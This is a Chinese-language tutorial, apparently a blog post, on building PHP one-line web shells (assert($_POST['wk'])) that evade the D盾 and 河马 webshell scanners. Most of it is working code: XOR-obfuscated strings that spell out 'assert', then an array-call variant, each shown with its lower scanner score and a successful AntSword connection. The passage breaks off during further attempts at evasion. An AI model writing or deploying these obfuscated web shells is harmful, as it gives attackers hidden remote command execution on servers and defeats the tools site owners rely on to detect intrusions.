**1 D盾免杀**  
    先从最简单的一句话开始。  

*   
*   
*   

```
`<?php``assert($_POST['wk']);``?>`
```

![](../Images/e51a114f5e422cf5f156f79fca429785.png)    毫无疑问，可疑等级5。    首先assert肯定是首先考虑绕过的，这里先尝试最常见的异或绕过。

*   
*   
*   
*   

```
`<?php ``$a=('!'^'@').'ssert';``$a($_POST['wk']);``?>`
```

    异或的原理是Ascii值的转换，！为33而@为64，转换原理是把33与64分别换成二进制，然后相加在转换成字符就是a，和后面代码拼接就可以成为assert，这种方式可以绕过waf，构成免杀php一句话。    基于此，所以尝试构造我们的一句话。  

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
`<?php``$s1='@'^'!';    //a``$s2='-'^'^';    //s``$s3='>'^'[';    //e``$s4='['^')';    //r``$s5='*'^'^';    //t``$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert``$d($_POST['wk']);``?>`
```

![](../Images/7e467a3d81b970905844755b1865700c.png)    得到了一些效果，危险等级降到了4。    看检测说明，D盾识别出了assert后面携带可控的post变量，报了危险，那我们尝试执行个固定的命令。

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
`<?php``$s1='@'^'!';    //a``$s2='-'^'^';    //s``$s3='>'^'[';    //e``$s4='['^')';    //r``$s5='*'^'^';    //t``$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert``$d("echo 111");``?>`
```

![](../Images/ac3bd085fd2a78ab79f78c332c457352.png)    可疑程度为2，看来D盾对于assert的动态调用有检测，那我们可以尝试利用其他的形式来调用，这里我们尝试数组形式调用。  

*

*

```
`<?php``$s1='@'^'!';    //a``$s2='-'^'^';    //s``$s3='>'^'[';    //e``$s4='['^')';    //r``$s5='*'^'^';    //t``$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert``$arr = [''=>$d($_POST['wk'])];``?>`
```

![](../Images/13412c8a3cb72d0e7e4875bc65b6f865.png)    可疑程度降到1了，继续排查可疑点，发现null值可以绕过。


![](../Images/f10bf7ae248c712eaf4e044a785b73d2.png)    测试蚁剑连接，没问题。

**2 河马绕过**    刚高兴没多久，把刚刚过D盾的一句话放到河马检测，报红了。![](../Images/63f2289f86c3c9131bc0ad66ab4132cb.png)![](../Images/c3901e8c699ba173037fbb28feb4c5a5.png)    猜测大概率是$\_POST\['wk'\]没过，这里我们尝试利用PHP特性，在PHP中${}，会把花括号里面的字符串转成变量名，利用这个特性我们构造一句话。

![](../Images/d766770e91c889dbd7620559bc1779f4.png)    测试蚁剑连接，没问题。![](../Images/79a02eefa0ef47b339dec8acea20020b.png)![](../Images/19ce9e08300209c562bd61187c0499e5.png)

![](../Images/29c0f1841f19f7caf1ca62ff85a514f1.png)    还是没过，接着继续尝试在拼接字符串中插入无效字符混淆，看看能不能过。
